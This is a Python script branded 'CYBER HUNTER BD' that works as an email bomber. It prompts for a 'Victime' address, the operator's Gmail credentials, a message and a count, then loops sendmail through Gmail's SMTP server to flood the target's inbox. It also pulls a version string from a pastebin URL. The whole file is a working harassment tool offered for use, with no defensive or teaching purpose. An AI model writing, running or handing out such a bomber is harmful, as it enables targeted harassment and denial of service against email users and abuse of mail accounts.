import smtplib
import time
import os
import sys
import marshal
import requests
import zlib
import time
import requests
import mechanize
import sys
import os
os.system("clear")
blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'

os.system("clear")
N = '\033[0m'
D = '\033[90m'
W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
P="\033[0;35m"
Y = '\033[1;33m'
C = '\033[1;36m'	
import os,requests
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
pink="\x1b[95m"
blue="\x1b[94m"
underline='\x1b[4m'
colouroff="\x1b[00m"

os.system('clear')
r=requests.get('https://pastebin.com/raw/Ga6ej4mA').text
logu=(pink+f"""
\t  ____      _   _      ____
\t / ___|    | | | |    | __ )
\t| |        | |_| |    |  _ \    """+colouroff+underline+"""CYBER HUNTER BD"""+colouroff+pink+"""
\t| |___     |  _  |    | |_) |
\t \____|    |_| |_|    |____/ 
\n"""+blue+"""           Focous on Your Aim, You Will winner""")


line=end+"\n__________________________________________________________"
def a():
	print(logu+"\n\n	"+green+"   Developed By : MD ALAMIN CHOWDORY"+green+"\n\n 	"+red+"   Version :"+r+"\n\n           FB CLONE  "+line)

a()

bomb_email = input(cyan+"\nEnter Victime\x1b[1;93m Email : ")
email =input(cyan+"\nEnter your\033[1;96 mail: ")
password =input(green+"\npassword: ")
message=(input(green+"\nEnter\x1b[94mMessage: "))
amount=int(input(cyan+"\nEnterTheAmount :"))
		
mail = smtplib.SMTP('smtp.gmail.com',587)
mail.ehlo()
mail.starttls()
mail.login(email,password)
os.system("clear")
a()
print(green+"\n\nCBB TOOL START WAIT...... \n\n")
for i in range(amount):
		mail.sendmail(email,bomb_email,message)
		print(green+"\n\t\tCBB✔✔"+str(i+1)+"⇨⇨ Mail Sent ")

